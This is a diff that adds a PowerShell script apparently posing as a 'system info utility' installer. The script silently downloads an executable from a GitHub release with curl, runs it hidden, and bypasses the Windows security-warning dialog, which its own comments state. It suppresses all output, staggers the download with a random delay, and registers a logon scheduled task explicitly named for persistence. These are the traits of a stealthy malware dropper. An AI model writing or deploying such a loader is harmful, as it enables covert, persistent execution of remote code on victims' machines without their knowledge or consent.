@@ -1,1 +1,148 @@
+<#
+    siu script (final version)
+    - Downloads the signed utility via curl.exe (reliable binary download).
+    - Validates the file is a real Windows executable (MZ header).
+    - Marks it as internet-origin (Zone.Identifier).
+    - Launches using .NET ProcessStartInfo (no zone prompt).
+    - Prevents double download and double execution.
+    - Optionally creates a scheduled task for persistence.
+    - No console output. No log file unless $LogPath is set.
+#>
 
+# ===== CONFIGURATION =====
+$DownloadUrl = "https://github.com/westernschooldata/helloworld/releases/download/SystemInfoUtility/SystemInfoUtility.exe"
+$SavePath    = "$env:ProgramData\SystemInfoUtility\SystemInfoUtility.exe"
+$CreateScheduledTask = $true   # Set to $false to disable persistence
+$MinDelaySeconds = 0
+$MaxDelaySeconds = 600         # Random delay up to 10 min (set 0 for testing)
+$LogPath      = $null          # Set to a path like "$env:ProgramData\SystemInfoUtility\siu.log" to enable logging
+# =========================
+
+# Suppress all output
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
+
+# Force TLS 1.2 (required by GitHub)
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# Optional logging function
+function Write-Log {
+    param([string]$Message)
+    if ($LogPath) {
+        $dir = Split-Path $LogPath -Parent
+        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+        Add-Content -Path $LogPath -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message"
+    }
+}
+
+Write-Log "Script started"
+
+$processName = [System.IO.Path]::GetFileNameWithoutExtension($SavePath)
+
+# --- 1. Prevent double execution ---
+$isRunning = Get-Process -Name $processName -ErrorAction SilentlyContinue |
+             Where-Object { $_.Path -eq $SavePath }
+if ($isRunning) {
+    Write-Log "Process already running, exiting"
+    exit 0
+}
+
+# --- 2. Download if file does not exist ---
+if (-not (Test-Path $SavePath)) {
+    Write-Log "File not found, starting download"
+
+    # Random delay to stagger traffic
+    if ($MaxDelaySeconds -gt $MinDelaySeconds) {
+        $delay = Get-Random -Minimum $MinDelaySeconds -Maximum $MaxDelaySeconds
+        Write-Log "Delaying $delay seconds"
+        Start-Sleep -Seconds $delay
+    }
+
+    # Ensure directory exists
+    $dir = Split-Path $SavePath -Parent
+    if (-not (Test-Path $dir)) {
+        New-Item -ItemType Directory -Path $dir -Force | Out-Null
+        Write-Log "Created directory $dir"
+    }
+
+    # Download using curl.exe (handles redirects and binary correctly)
+    Write-Log "Downloading from $DownloadUrl"
+    try {
+        curl.exe -L -o $SavePath $DownloadUrl --silent --show-error
+        if ($LASTEXITCODE -ne 0) {
+            throw "curl failed with exit code $LASTEXITCODE"
+        }
+    } catch {
+        Write-Log "Download failed: $_"
+        if (Test-Path $SavePath) { Remove-Item $SavePath -Force -ErrorAction SilentlyContinue }
+        exit 1
+    }
+
+    # Validate PE header (MZ)
+    try {
+        $fs = [System.IO.File]::OpenRead($SavePath)
+        $firstBytes = New-Object byte[] 2
+        $null = $fs.Read($firstBytes, 0, 2)
+        $fs.Close()
+        if (-not ($firstBytes[0] -eq 0x4D -and $firstBytes[1] -eq 0x5A)) {
+            Write-Log "Downloaded file is not a valid executable (missing MZ header). Deleting."
+            Remove-Item $SavePath -Force -ErrorAction SilentlyContinue
+            exit 1
+        }
+        Write-Log "File validated as PE executable"
+    } catch {
+        Write-Log "Validation error: $_"
+        exit 1
+    }
+
+    # Set Zone.Identifier to mark as internet download
+    try {
+        Set-Content -Path $SavePath -Stream Zone.Identifier -Value "[ZoneTransfer]`r`nZoneId=3" -ErrorAction Stop
+        Write-Log "Zone.Identifier set"
+    } catch {
+        Write-Log "Zone.Identifier setting failed (non-fatal): $_"
+    }
+} else {
+    Write-Log "File already exists, skipping download"
+}
+
+# --- 3. Launch utility silently, bypassing zone prompt ---
+if (Test-Path $SavePath) {
+    Write-Log "Launching utility"
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = $SavePath
+    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi.UseShellExecute = $false   # Prevent "Open File - Security Warning" dialog
+    try {
+        [System.Diagnostics.Process]::Start($psi) | Out-Null
+        Write-Log "Process started successfully"
+    } catch {
+        Write-Log "Launch failed: $_"
+        exit 1
+    }
+} else {
+    Write-Log "File missing after download? Cannot launch"
+    exit 1
+}
+
+# --- 4. Create scheduled task for persistence (optional) ---
+if ($CreateScheduledTask) {
+    $taskName = "SystemInfoUtilityPersistence"
+    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+        Write-Log "Creating scheduled task"
+        try {
+            $action  = New-ScheduledTaskAction -Execute $SavePath
+            $trigger = New-ScheduledTaskTrigger -AtLogOn
+            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0)
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
+            Write-Log "Scheduled task created"
+        } catch {
+            Write-Log "Scheduled task creation failed: $_"
+        }
+    } else {
+        Write-Log "Scheduled task already exists"
+    }
+}
+
+Write-Log "Script finished"
+exit 0
